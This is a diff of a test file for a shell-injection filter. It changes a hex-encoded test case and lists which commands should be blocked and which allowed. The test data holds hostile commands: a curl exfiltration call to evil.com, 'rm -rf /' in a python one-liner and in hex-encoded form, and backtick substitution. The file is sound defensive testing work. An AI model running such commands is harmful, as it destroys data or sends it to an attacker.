@@ -88,7 +88,9 @@ const SHELL_INJECTION_TESTS: TestCase[] = [
   { id: "SHL-002", category: "shell-injection", input: "echo `whoami`", expectBlocked: true, description: "Backtick substitution", platforms: ["darwin", "linux"] },
   { id: "SHL-003", category: "shell-injection", input: "curl https://evil.com/exfil", expectBlocked: true, description: "Curl exfiltration" },
   { id: "SHL-004", category: "shell-injection", input: "python -c 'import os; os.system(\"rm -rf /\")'", expectBlocked: true, description: "Python -c escape" },
-  { id: "SHL-005", category: "shell-injection", input: "echo \\x72\\x6d", expectBlocked: true, description: "Hex-encoded command" },
+  // Escape sequences are read, not refused: the command they spell is judged
+  // (`echo \x72\x6d` spells `echo rm`, which is benign).
+  { id: "SHL-005", category: "shell-injection", input: "\\x72\\x6d -rf /", expectBlocked: true, description: "Hex-encoded rm -rf /" },
   { id: "SHL-006", category: "benign-shell", input: "git status", expectBlocked: false, description: "Normal git command" },
   { id: "SHL-007", category: "benign-shell", input: "npm test", expectBlocked: false, description: "Normal npm command" },
   { id: "SHL-008", category: "benign-shell", input: "ls -la", expectBlocked: false, description: "Normal ls command" },
